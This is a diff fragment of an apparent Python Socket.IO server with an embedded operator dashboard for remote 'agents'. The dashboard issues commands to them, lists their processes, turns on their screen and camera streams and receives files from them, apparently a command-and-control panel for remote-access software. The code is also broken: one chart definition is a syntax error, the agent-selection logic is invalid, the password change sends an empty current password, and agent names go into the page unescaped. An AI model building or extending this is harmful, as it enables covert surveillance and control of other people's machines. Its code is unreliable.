+              <select id="webrtc-quality" class="quality-select" onchange="setWebRTCQuality()">
+                <option value="auto">Auto</option>
+                <option value="high">High</option>
+                <option value="medium">Medium</option>
+                <option value="low">Low</option>
+              </select>
+            </div>
+          </div>
+
+          <div style="font-weight:700;margin-bottom:8px">WebRTC Status</div>
+          <div class="webrtc-status" id="webrtc-status">
+            <div class="status-item">
+              <span class="status-label">Connection:</span>
+              <span class="status-value" id="webrtc-connection">Disconnected</span>
+            </div>
+            <div class="status-item">
+              <span class="status-label">Latency:</span>
+              <span class="status-value" id="webrtc-latency">--</span>
+            </div>
+            <div class="status-item">
+              <span class="status-label">Quality:</span>
+              <span class="status-value" id="webrtc-quality-status">--</span>
+            </div>
+          </div>
+
+          <div style="margin-top:12px;font-weight:700">Output</div>
+          <div class="terminal" id="output-terminal">NEURAL_TERMINAL_v2.1 &gt; Waiting for events...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT -->
+    <div class="rightcol">
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="font-weight:700">Quick Metrics</div>
+          <div class="muted small">Real-time</div>
+        </div>
+        <div class="metric-grid" style="margin-top:12px">
+          <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
+          <div class="metric-pill"><div class="v" id="m2">3</div><div class="small muted">Active Streams</div></div>
+          <div class="metric-pill"><div class="v" id="m3">95%</div><div class="small muted">Stream Health</div></div>
+          <div class="metric-pill"><div class="v" id="m4">120ms</div><div class="small muted">Avg Latency</div></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div style="font-weight:700">Config Status</div>
+          <div class="muted small">Last updated: <span id="cfg-time">—</span></div>
+        </div>
+        <div style="margin-top:12px;display:grid;gap:8px">
+          <div style="display:flex;justify-content:space-between"><div class="muted">Admin password set</div><div id="cfg1">Yes</div></div>
+          <div style="display:flex;justify-content:space-between"><div class="muted">Secret key</div><div id="cfg2">Hidden</div></div>
+          <div style="display:flex;justify-content:space-between"><div class="muted">Session timeout</div><div id="cfg3">3600s</div></div>
+          <div style="display:flex;justify-content:space-between"><div class="muted">Blocked IPs</div><div id="cfg4">0</div></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div style="font-weight:700;margin-bottom:8px">Password Management</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <input id="new-pass" placeholder="New password" style="padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:#fff">
+          <button class="control-btn primary" onclick="changePassword()">Change Password</button>
+          <div class="small muted">Make sure you are connected via secure channel.</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+<script>
+  /* --------- Socket.IO hook (existing server) --------- */
+  const socket = io();
+
+  // Example socket events wiring - adapt to your server event names
+  socket.on('connect', ()=> {
+    appendLog('Socket connected: ' + socket.id);
+    updateMetric('m1', '---');
+  });
+
+  socket.on('agent_list', data => {
+    renderAgentList(data);
+  });
+
+  socket.on('terminal_output', data => {
+    appendLog(data);
+  });
+
+  socket.on('config_status', data => {
+    document.getElementById('cfg-time').innerText = new Date().toLocaleTimeString();
+    document.getElementById('cfg1').innerText = data.admin_password_set ? 'Yes':'No';
+    document.getElementById('cfg3').innerText = data.session_timeout + 's';
+    document.getElementById('cfg4').innerText = data.blocked_ips.length;
+  });
+  
+  // WebRTC event handlers
+  socket.on('webrtc_started', data => {
+    appendLog('WebRTC streaming started for agent: ' + data.agent_id);
+    updateWebRTCStatus('Connected', 'connected');
+    updateMetric('m2', parseInt(document.getElementById('m2').innerText || '0') + 1);
+    
+    // Update WebRTC video status
+    const webrtcStatusEl = document.getElementById('webrtc-status');
+    if(webrtcStatusEl){
+      webrtcStatusEl.textContent = 'Connected';
+      webrtcStatusEl.style.color = '#0ee6a6';
+    }
+  });
+  
+  socket.on('webrtc_stopped', data => {
+    appendLog('WebRTC streaming stopped for agent: ' + data.agent_id);
+    updateWebRTCStatus('Disconnected', 'disconnected');
+    updateMetric('m2', Math.max(0, parseInt(document.getElementById('m2').innerText || '0') - 1));
+    
+    // Update WebRTC video status
+    const webrtcStatusEl = document.getElementById('webrtc-status');
+    if(webrtcStatusEl){
+      webrtcStatusEl.textContent = 'Disconnected';
+      webrtcStatusEl.style.color = '#ff5c7c';
+    }
+  });
+  
+  socket.on('webrtc_stats', data => {
+    appendLog('WebRTC stats received: ' + JSON.stringify(data.stats));
+    if(data.stats.latency) {
+      document.getElementById('webrtc-latency').innerText = data.stats.latency + 'ms';
+    }
+    if(data.stats.quality) {
+      document.getElementById('webrtc-quality-status').innerText = data.stats.quality;
+    }
+  });
+  
+  socket.on('webrtc_error', data => {
+    appendLog('WebRTC error: ' + data.message);
+    updateWebRTCStatus('Error', 'disconnected');
+    
+    // Update WebRTC video status
+    const webrtcStatusEl = document.getElementById('webrtc-status');
+    if(webrtcStatusEl){
+      webrtcStatusEl.textContent = 'Error';
+      webrtcStatusEl.style.color = '#ff5c7c';
+    }
+  });
+
+  /* --------- Render helpers --------- */
+  function appendLog(msg){
+    const el = document.getElementById('output-terminal');
+    el.innerText = (new Date().toLocaleTimeString()) + ' > ' + msg + '\\n' + el.innerText;
+  }
+  function renderAgentList(list){
+    const container = document.getElementById('agent-list');
+    container.innerHTML = '';
+    if(!list || list.length===0){
+      container.innerHTML = '<div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">No agents connected</div>';
+      return;
+    }
+    list.forEach(a=>{
+      const item = document.createElement('div');
+      item.className='agent-item';
+      item.innerHTML = `<div class="meta"><div style="display:flex;flex-direction:column"><div class="agent-name">${a.name || a.id}</div><div class="agent-sub">${a.os||'unknown'}</div></div></div><div style="display:flex;align-items:center;gap:8px"><div class="agent-bullet ${a.online?'bullet-online':'bullet-off'}"></div><div class="muted small">${a.id}</div></div>`;
+      item.onclick = ()=>{ selectAgent(a.id); };
+      container.appendChild(item);
+    });
+  }
+  function selectAgent(id){ 
+    // Remove previous selection
+    document.querySelectorAll('.agent-item').forEach(item => item.classList.remove('selected'));
+    
+    // Add selection to clicked item
+    const selectedItem = document.querySelector(`.agent-item:has(.agent-sub:contains('${id}'))`);
+    if(selectedItem) {
+      selectedItem.classList.add('selected');
+    }
+    
+    // Update agent ID for commands
+    document.getElementById('agent-id')?.setAttribute('value', id); 
+    appendLog('Selected agent '+id); 
+  }
+
+  /* --------- Chart.js: doughnuts + trend --------- */
+  const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};
+
+  const d1 = new Chart(document.getElementById('doughnut1').getContext('2d'),{
+    type:'doughnut',
+    data:{labels:['CSC','Non-CSC','Other'], datasets:[{data:[60,30,10], backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
+    options:doughnutOpts
+  });
+  const d2 = new Chart(document.getElementById('doughnut2').getContext('2d'),{
+    type:'doughnut',
+    data:{labels:['High','Medium','Low'], datasets:[{data:[40,30,30], backgroundColor:[getColor('--accent-b'),getColor('--accent-a'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
+    options:doughnutOpts
+  });
+  const d3 = new Chart(document.getElementById('doughnut3').getContext('2d'),{
+    type:'doughnut',
+    data:{labels:['Pass','Fail'], datasets:[{data:[59,41], backgroundColor:['rgba(0,255,190,0.12)','rgba(255,92,124,0.12)'], borderWidth:0}], borderWidth:0}]},
+    options:doughnutOpts
+  });
+
+  const trendCtx = document.getElementById('trendChart').getContext('2d');
+  const trendChart = new Chart(trendCtx, {
+    type: 'line',
+    data: {
+      labels: Array.from({length:30}, (_,i)=>'Day '+(i+1)),
+      datasets: [
+        {label:'Security', data: randomSeries(30,40,85), borderColor:getColor('--accent-a'), tension:0.28, pointRadius:2, fill:false},
+        {label:'Identity', data: randomSeries(30,20,70), borderColor:getColor('--accent-b'), tension:0.28, pointRadius:2, fill:false},
+        {label:'Network', data: randomSeries(30,10,60), borderColor:'#9be8ff', tension:0.28, pointRadius:2, fill:false},
+        {label:'Service', data: randomSeries(30,5,55), borderColor:'#7ee3b6', tension:0.28, pointRadius:2, fill:false}
+      ]
+    },
+    options:{
+      responsive:true, maintainAspectRatio:false,
+      plugins:{legend:{labels:{color:'#cfeaff'}}},
+      scales:{
+        x:{grid:{display:false}, ticks:{color:'#9fb8d8'}},
+        y:{grid:{color:'rgba(255,255,255,0.03)'}, ticks:{color:'#9fb8d8'}}
+      }
+    }
+  });
+
+  function randomSeries(n,min,max){ return Array.from({length:n}, ()=> Math.round(Math.random()*(max-min)+min)); }
+  function getColor(varName){
+    // read value from CSS variable
+    return getComputedStyle(document.documentElement).getPropertyValue(varName) || '#00d4ff';
+  }
+
+  /* --------- helpers for updating DOM metrics --------- */
+  function updateMetric(id,val){ const el=document.getElementById(id); if(el) el.innerText=val; }
+  function appendToEl(id,txt){ const e=document.getElementById(id); if(e) e.innerText += '\\n'+txt; }
+
+  /* --------- placeholder functions preserved from original file - keep your existing implementations if needed --------- */
+  function issueCommand(){ const cmd = document.getElementById('command')?.value || ''; if(cmd) { socket.emit('issue_command', {command:cmd}); appendLog('Issued command: '+cmd);} }
+  function listProcesses(){ socket.emit('list_processes'); appendLog('Requested process list'); }
+  function startScreenStream(){ socket.emit('start_screen_stream'); appendLog('Start screen stream request'); }
+  function startCameraStream(){ socket.emit('start_camera_stream'); appendLog('Start camera stream request'); }
+  function stopAllStreams(){ socket.emit('stop_all_streams'); appendLog('Stop all streams request'); }
+  function stopScreenStream(){ socket.emit('stop_screen_stream'); appendLog('Stop screen stream request'); }
+  
+  /* --------- WebRTC Functions --------- */
+  function startWebRTCStream(){
+    const selectedAgent = getSelectedAgent();
+    if(!selectedAgent){
+      appendLog('No agent selected for WebRTC streaming');
+      return;
+    }
+    socket.emit('webrtc_start_streaming', {agent_id: selectedAgent, stream_type: 'screen'});
+    appendLog('Starting WebRTC streaming for agent: ' + selectedAgent);
+    updateWebRTCStatus('Connecting...', 'warning');
+  }
+  
+  function stopWebRTCStream(){
+    const selectedAgent = getSelectedAgent();
+    if(!selectedAgent){
+      appendLog('No agent selected for WebRTC streaming');
+      return;
+    }
+    socket.emit('webrtc_stop_streaming', {agent_id: selectedAgent});
+    appendLog('Stopping WebRTC streaming for agent: ' + selectedAgent);
+    updateWebRTCStatus('Disconnected', 'disconnected');
+  }
+  
+  function getWebRTCStats(){
+    const selectedAgent = getSelectedAgent();
+    if(!selectedAgent){
+      appendLog('No agent selected for WebRTC stats');
+      return;
+    }
+    socket.emit('webrtc_get_stats', {agent_id: selectedAgent});
+    appendLog('Requesting WebRTC stats for agent: ' + selectedAgent);
+  }
+  
+  function setWebRTCQuality(){
+    const quality = document.getElementById('webrtc-quality').value;
+    const selectedAgent = getSelectedAgent();
+    if(!selectedAgent){
+      appendLog('No agent selected for quality change');
+      return;
+    }
+    socket.emit('webrtc_set_quality', {agent_id: selectedAgent, quality: quality});
+    appendLog('Setting WebRTC quality to: ' + quality + ' for agent: ' + selectedAgent);
+    updateWebRTCStatus('Quality: ' + quality, 'connected');
+  }
+  
+  function updateWebRTCStatus(message, type = 'info'){
+    const statusEl = document.getElementById('webrtc-connection');
+    if(statusEl){
+      statusEl.textContent = message;
+      statusEl.className = 'status-value ' + type;
+    }
+  }
+  
+  function getSelectedAgent(){
+    // Get the currently selected agent ID from the agent list
+    const selectedItem = document.querySelector('.agent-item.selected');
+    if(selectedItem){
+      const agentIdEl = selectedItem.querySelector('.agent-sub');
+      return agentIdEl ? agentIdEl.textContent : null;
+    }
+    return null;
+  }
+  
+  function changePassword(){
+    const p = document.getElementById('new-pass').value;
+    if(!p || p.length<8){ alert('Choose password >= 8 chars'); return; }
+    fetch('/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({current_password:'', new_password:p})})
+      .then(r=>r.json()).then(j=>{ if(j.success) alert('Password changed'); else alert('Error: '+j.message) }).catch(e=>alert('Error'));
+  }
+
+  /* demo: update metrics every 7s */
+  setInterval(()=>{ updateMetric('metric1', Math.floor(Math.random()*60)); updateMetric('metric2', Math.floor(Math.random()*40)); updateMetric('metric3', Math.floor(Math.random()*100)+'%'); updateMetric('m1', Math.floor(Math.random()*20)); },7000);
+
+  /* demo: append a start line */
+  appendLog('Dashboard ready — waiting for agents');
+
+</script>
 </body>
 </html>
+
+
+
+
+
+
+            
+
+
+
+
+
+
+
+
+
+
+
+
+
 '''
 
 # In-memory storage for agent data
@@ -3445,12 +2210,7 @@ def handle_file_chunk_from_agent(data):
             'total_size': total_size
         }, room='operators')
 
-# Global variables for WebRTC and video streaming
-WEBRTC_PEER_CONNECTIONS = {}
-WEBRTC_VIEWER_CONNECTIONS = {}
-VIDEO_FRAMES_H264 = defaultdict(lambda: None)
-CAMERA_FRAMES_H264 = defaultdict(lambda: None)
-AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
+
 
 @socketio.on('screen_frame')
 def handle_screen_frame(data):
